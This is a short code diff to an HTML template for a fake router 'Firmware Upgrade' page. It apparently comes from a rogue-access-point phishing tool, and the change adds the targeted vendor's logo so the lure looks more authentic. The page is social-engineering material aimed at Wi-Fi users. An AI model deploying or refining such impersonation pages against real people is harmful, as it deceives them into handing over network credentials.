@@ -128,6 +128,9 @@
   <!-- Start page content -->
   <div class="container">
 	   <div class="col-sm">
+       {% if target_ap_logo_path is not none %}
+         <center><img src="{{ target_ap_logo_path }}"></img></center>
+       {% endif %}
        <h2 class="text-center" style="color:CornflowerBlue">Firmware Upgrade</h2>
     	 <p class="lead">A new version of the {{ target_ap_vendor if target_ap_vendor != None}} firmware ({{ firmware_version }}) has been detected and awaiting installation. Please review our new terms and conditions and proceed.</p>
      </div>
